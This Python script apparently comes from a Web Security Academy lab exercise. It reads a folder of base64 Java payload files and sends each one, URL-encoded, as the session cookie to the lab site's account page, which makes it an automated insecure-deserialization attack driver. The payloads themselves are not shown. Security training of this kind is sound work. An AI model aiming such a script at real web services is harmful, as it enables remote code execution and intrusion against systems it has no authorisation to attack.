import requests
import os
import urllib.parse
import time

burp0_url = "https://0a87007b0484ea5180a52b7900f50021.web-security-academy.net:443/my-account?id=wiener"
burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Referer": "https://0a87007b0484ea5180a52b7900f50021.web-security-academy.net/login", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1", "Te": "trailers"}

system =os.walk('/home/kali/Documents/javapayloads' , topdown=True)
for root , dir , files in system :
    for file in files :
        print ("tsting for " + file)
   
        eachfile=open(f'/home/kali/Documents/javapayloads/{file}', 'r')
    
        file_base64 = eachfile.readline()
        file_urlencode = urllib.parse.quote(file_base64)
    
        burp0_cookies = {"session": f"{file_urlencode}"}
        requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
        #print(file_base64)
        #print(file_urlencode)
        time.sleep(15)
        eachfile.close()